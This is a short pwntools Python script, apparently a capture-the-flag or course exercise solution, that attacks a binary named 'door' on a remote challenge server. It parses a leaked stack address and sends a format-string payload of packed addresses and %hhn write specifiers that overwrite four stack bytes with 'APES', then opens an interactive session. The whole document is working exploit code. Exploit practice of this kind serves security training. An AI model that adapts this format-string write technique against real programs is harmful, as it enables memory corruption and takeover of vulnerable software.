from pwn import *
import re

p = process("./door")
p = remote('plsdonthaq.me', 4001)

p.recvuntil(b'A landslide has blocked the way at ')

landSlideAddress = int(p.recvline(keepends=False), 16)
print(f"ebp-0x5 = {hex(landSlideAddress)}")

ebp = landSlideAddress + 0x5
print(f"Calculated ebp = {hex(ebp)}")

## fgets(ebp-0x205, 0x200, stdin)
## printf(ebp-0x205)

# We want to overwrite the contents at ebp-0x205 to be "APES"
payload = b''
payload += b'.' # Offset
payload += p32(landSlideAddress)   # Write 65
payload += p32(landSlideAddress+1) # Write 80
payload += p32(landSlideAddress+2) # Write 69
payload += p32(landSlideAddress+3) # Write 83
# 17 characters already used

p.sendline(payload + b'%48c%2$hhn' + b'yeet%4$hhn' + b'%11c%3$hhn' + b'lol%5$hhn')
#               17      + 48 = 65        + 4 = 69       + 11 = 80       + 3 = 83

p.interactive()




